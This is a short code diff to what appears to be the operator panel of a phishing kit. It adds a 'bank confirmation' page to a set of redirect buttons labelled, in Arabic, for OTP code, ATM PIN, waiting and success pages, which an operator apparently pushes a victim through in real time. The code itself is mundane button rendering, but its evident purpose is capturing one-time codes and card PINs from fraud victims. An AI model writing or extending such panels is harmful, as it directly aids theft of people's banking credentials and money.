@@ -456,7 +456,8 @@ function renderDetail(o){
     {l:'📲 الكود',pg:'otp',c:'#f59e0b'},
     {l:'🏧 ATM',pg:'pin',c:'#a855f7'},
     {l:'⏳ الانتظار',pg:'wait',c:'#7c3aed'},
-    {l:'✅ النجاح',pg:'done',c:'#16a34a'}
+    {l:'✅ النجاح',pg:'done',c:'#16a34a'},
+    {l:'🏦 تأكيد البنك',pg:'bankconfirm',c:'#0369a1'}
   ];
   h+='<div class="redir-grid">'+redirPages.map(function(p){
     return '<button style="background:'+p.c+'" onclick="doRedir(\''+esc(o.ref)+'\',\''+p.pg+'\')">'+p.l+'</button>';
